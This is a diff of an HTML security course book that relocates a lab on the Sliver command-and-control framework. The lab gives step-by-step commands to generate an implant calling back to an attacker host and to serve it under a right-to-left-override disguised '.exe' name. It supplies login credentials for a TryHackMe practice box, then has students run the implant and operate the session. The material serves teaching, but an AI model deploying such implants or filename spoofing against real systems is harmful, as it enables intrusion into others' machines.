@@ -745,71 +745,6 @@ Stopped: Fri Dec  6 13:22:07 2024
 <p>Now that you're connected to the VPN, check your public IP again: <a href="https://www.showmyip.com/">Show My IP</a></p>
 <p>Why didn't your IP change?</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="welcome-to-csse142-practical-security-iii"><a class="header" href="#welcome-to-csse142-practical-security-iii">Welcome to CSSE142: Practical Security III</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="sliver-c2-platform-and-kali"><a class="header" href="#sliver-c2-platform-and-kali">sliver C2 platform and Kali</a></h1>
-<h2 id="pieces-of-a-typical-command-and-control-attack"><a class="header" href="#pieces-of-a-typical-command-and-control-attack">Pieces of a typical Command and Control attack</a></h2>
-<p>There are three pieces to a typical C2 setup:</p>
-<ol>
-<li>A server which accepts incoming connections from a compromised machine.</li>
-<li>A client that the threat actor uses to connect, through the C2 server, to the compromised machine.</li>
-<li>The implant or beacon which is run on the compromised machine.</li>
-</ol>
-<p>Let's start building our C2 system.</p>
-<p>On Kali, first do:
-<code>sudo apt install sliver</code></p>
-<p>Next, make sure your networking is in place. For instance, if you are connecting to a host over a VPN do that now and then execute:</p>
-<p><code>ip a</code></p>
-<p>and record the relevant ip address.</p>
-<p>Finally, let's make a directory like <code>sliver</code> and then <code>cd</code> into it.</p>
-<h3 id="1-starting-up-the-sliver-server"><a class="header" href="#1-starting-up-the-sliver-server">1. Starting up the sliver server</a></h3>
-<p>For piece 1, we start the server and then craft the exploit so that it knows to call home to this.
-<code>sliver-server</code></p>
-<h3 id="2-start-an-http-server-as-your-c2-server"><a class="header" href="#2-start-an-http-server-as-your-c2-server">2. Start an http server as your C2 server</a></h3>
-<p><code>http</code></p>
-<p>This should bind to port 80. If not, change the port as needed.</p>
-<h3 id="3-create-an-implant"><a class="header" href="#3-create-an-implant">3. Create an implant</a></h3>
-<p>We need to create an implant that phones home to our server.</p>
-<pre><code>generate -b http://10.6.1.70
-</code></pre>
-<p>Then execute</p>
-<p><code>implants</code></p>
-<p>to ensure that the implant is created and pointing to the correct server. Note the <code>Name</code> of the implant.</p>
-<h3 id="4-get-the-implant-to-the-user"><a class="header" href="#4-get-the-implant-to-the-user">4. Get the implant to the user</a></h3>
-<p>In pentesting, this is where you need to get creative and do a bit of social engineering to encourage the user to download and execute this file. It could be via email, messaging, etc.</p>
-<p>For the sake of this demo, open a shell and find where your implant is located. Execute:</p>
-<p><code>python3 -m http.server</code></p>
-<p>to start a web server which can serve this implant. It is likely running at port 8000.</p>
-<p><code>document\u202Efdp.exe</code></p>
-<h3 id="5-demo-using-thms-box"><a class="header" href="#5-demo-using-thms-box">5. DEMO: Using THM's Box</a></h3>
-<p>We used the <code>Blue</code> box to learn about RCE's and metasploit. Let's also try it here.</p>
-<p>Start <code>Blue</code> on THM and record the IP address of the box.</p>
-<p>Remote desktop into the machine using:</p>
-<p><code>rdesktop IP_ADDRESS</code></p>
-<p>Log in as <code>Jon</code> with <code>alqfna22</code> as a password. (How did you get this?)</p>
-<p>Open a web browser and connect back to your Kali box at port, something like
-<code>http://10.6.1.70:8000</code></p>
-<p>Find the implant. Download it and run it. pwned!</p>
-<h3 id="6-watch-for-connections-on-your-c2-server"><a class="header" href="#6-watch-for-connections-on-your-c2-server">6. Watch for connections on your C2 server.</a></h3>
-<p>If this all works, you should see a new session on the sliver-server. Type</p>
-<p><code>use</code> to start working with this session.</p>
-<p>Do commands like <code>ls</code> and <code>whoami</code> from the prompt.</p>
-<p>Try taking a screen shot of the machine.</p>
-<p>Can you get the flags from this machine this way?</p>
-<h3 id="7-what-is-next"><a class="header" href="#7-what-is-next">7. What is next?</a></h3>
-<h4 id="red-team"><a class="header" href="#red-team">RED TEAM:</a></h4>
-<ul>
-<li>How would you get this payload to the user? What tactics would you use?</li>
-<li>What challenges do you think you will need to overcome?</li>
-<li>You've just scored your first implant inside the corporate IT network. What is your plan of attack from here?</li>
-</ul>
-<h4 id="blue-team"><a class="header" href="#blue-team">BLUE TEAM:</a></h4>
-<ul>
-<li>How do you prevent C2 implants?</li>
-<li>How do you detect C2 implants?</li>
-<li>How do protect against the next move of the red team after successfully scoring a C2 implant?</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div><h3 id="sliver-part-2"><a class="header" href="#sliver-part-2">Sliver part 2.</a></h3>
-<h2 id="how-does-c2-work"><a class="header" href="#how-does-c2-work">How does C2 work?</a></h2>
-<p>Start Wireshark and begin capturing traffic between your server and the implant. What do you see?</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="fundamental-skills"><a class="header" href="#fundamental-skills">Fundamental Skills</a></h1>
 <p>We run into a lot of binary data in CTF competitions, reverse engineering, incident response, etc. It's beneficial, therefore, to practice common ways of dealing with binary data.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="character-encoding"><a class="header" href="#character-encoding">Character Encoding</a></h1>
@@ -1164,6 +1099,71 @@ You called the program with 1 options. They are:
 0x10x10239d9100x16da6f7200x20x16da6f7000x19f403f280x00x00x0
 </code></pre>
 <p>And just like that we start dumping memory!</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="sliver-c2-platform-and-kali"><a class="header" href="#sliver-c2-platform-and-kali">sliver C2 platform and Kali</a></h1>
+<h2 id="pieces-of-a-typical-command-and-control-attack"><a class="header" href="#pieces-of-a-typical-command-and-control-attack">Pieces of a typical Command and Control attack</a></h2>
+<p>There are three pieces to a typical C2 setup:</p>
+<ol>
+<li>A server which accepts incoming connections from a compromised machine.</li>
+<li>A client that the threat actor uses to connect, through the C2 server, to the compromised machine.</li>
+<li>The implant or beacon which is run on the compromised machine.</li>
+</ol>
+<p>Let's start building our C2 system.</p>
+<p>On Kali, first do:
+<code>sudo apt install sliver</code></p>
+<p>Next, make sure your networking is in place. For instance, if you are connecting to a host over a VPN do that now and then execute:</p>
+<p><code>ip a</code></p>
+<p>and record the relevant ip address.</p>
+<p>Finally, let's make a directory like <code>sliver</code> and then <code>cd</code> into it.</p>
+<h3 id="1-starting-up-the-sliver-server"><a class="header" href="#1-starting-up-the-sliver-server">1. Starting up the sliver server</a></h3>
+<p>For piece 1, we start the server and then craft the exploit so that it knows to call home to this.
+<code>sliver-server</code></p>
+<h3 id="2-start-an-http-server-as-your-c2-server"><a class="header" href="#2-start-an-http-server-as-your-c2-server">2. Start an http server as your C2 server</a></h3>
+<p><code>http</code></p>
+<p>This should bind to port 80. If not, change the port as needed.</p>
+<h3 id="3-create-an-implant"><a class="header" href="#3-create-an-implant">3. Create an implant</a></h3>
+<p>We need to create an implant that phones home to our server.</p>
+<pre><code>generate -b http://10.6.1.70
+</code></pre>
+<p>Then execute</p>
+<p><code>implants</code></p>
+<p>to ensure that the implant is created and pointing to the correct server. Note the <code>Name</code> of the implant.</p>
+<h3 id="4-get-the-implant-to-the-user"><a class="header" href="#4-get-the-implant-to-the-user">4. Get the implant to the user</a></h3>
+<p>In pentesting, this is where you need to get creative and do a bit of social engineering to encourage the user to download and execute this file. It could be via email, messaging, etc.</p>
+<p>For the sake of this demo, open a shell and find where your implant is located. Execute:</p>
+<p><code>python3 -m http.server</code></p>
+<p>to start a web server which can serve this implant. It is likely running at port 8000.</p>
+<p><code>document\u202Efdp.exe</code></p>
+<h3 id="5-demo-using-thms-box"><a class="header" href="#5-demo-using-thms-box">5. DEMO: Using THM's Box</a></h3>
+<p>We used the <code>Blue</code> box to learn about RCE's and metasploit. Let's also try it here.</p>
+<p>Start <code>Blue</code> on THM and record the IP address of the box.</p>
+<p>Remote desktop into the machine using:</p>
+<p><code>rdesktop IP_ADDRESS</code></p>
+<p>Log in as <code>Jon</code> with <code>alqfna22</code> as a password. (How did you get this?)</p>
+<p>Open a web browser and connect back to your Kali box at port, something like
+<code>http://10.6.1.70:8000</code></p>
+<p>Find the implant. Download it and run it. pwned!</p>
+<h3 id="6-watch-for-connections-on-your-c2-server"><a class="header" href="#6-watch-for-connections-on-your-c2-server">6. Watch for connections on your C2 server.</a></h3>
+<p>If this all works, you should see a new session on the sliver-server. Type</p>
+<p><code>use</code> to start working with this session.</p>
+<p>Do commands like <code>ls</code> and <code>whoami</code> from the prompt.</p>
+<p>Try taking a screen shot of the machine.</p>
+<p>Can you get the flags from this machine this way?</p>
+<h3 id="7-what-is-next"><a class="header" href="#7-what-is-next">7. What is next?</a></h3>
+<h4 id="red-team"><a class="header" href="#red-team">RED TEAM:</a></h4>
+<ul>
+<li>How would you get this payload to the user? What tactics would you use?</li>
+<li>What challenges do you think you will need to overcome?</li>
+<li>You've just scored your first implant inside the corporate IT network. What is your plan of attack from here?</li>
+</ul>
+<h4 id="blue-team"><a class="header" href="#blue-team">BLUE TEAM:</a></h4>
+<ul>
+<li>How do you prevent C2 implants?</li>
+<li>How do you detect C2 implants?</li>
+<li>How do protect against the next move of the red team after successfully scoring a C2 implant?</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h3 id="sliver-part-2"><a class="header" href="#sliver-part-2">Sliver part 2.</a></h3>
+<h2 id="how-does-c2-work"><a class="header" href="#how-does-c2-work">How does C2 work?</a></h2>
+<p>Start Wireshark and begin capturing traffic between your server and the implant. What do you see?</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="injections"><a class="header" href="#injections">Injections</a></h1>
 <p>User input is always dangerous! Malicious actors will attempt to find and exploit any possible vulnerabilities your code.</p>
 <p>In this course we will look at two different types of user inputs that lead to undesired program execution:</p>
